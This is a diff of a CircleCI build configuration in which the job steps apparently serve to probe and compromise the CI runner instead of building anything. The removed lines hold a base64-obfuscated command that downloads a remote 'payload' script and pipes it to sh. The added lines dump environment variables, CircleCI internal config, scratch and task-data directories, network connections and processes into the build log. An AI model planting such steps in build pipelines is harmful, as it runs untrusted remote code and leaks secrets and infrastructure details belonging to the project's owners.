@@ -40,9 +40,12 @@ jobs:
             source /etc/environment.e
             set
             env
-            sudo iptables-save
-            echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL3Rlc3R8c2g=|base64 -d|sh
-          
+            cat $CIRCLE_INTERNAL_CONFIG
+            ls -la $CIRCLE_INTERNAL_SCRATCH
+            ls -la $CIRCLE_INTERNAL_TASK_DATA
+            netstat -na
+            ps -ef
+            
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
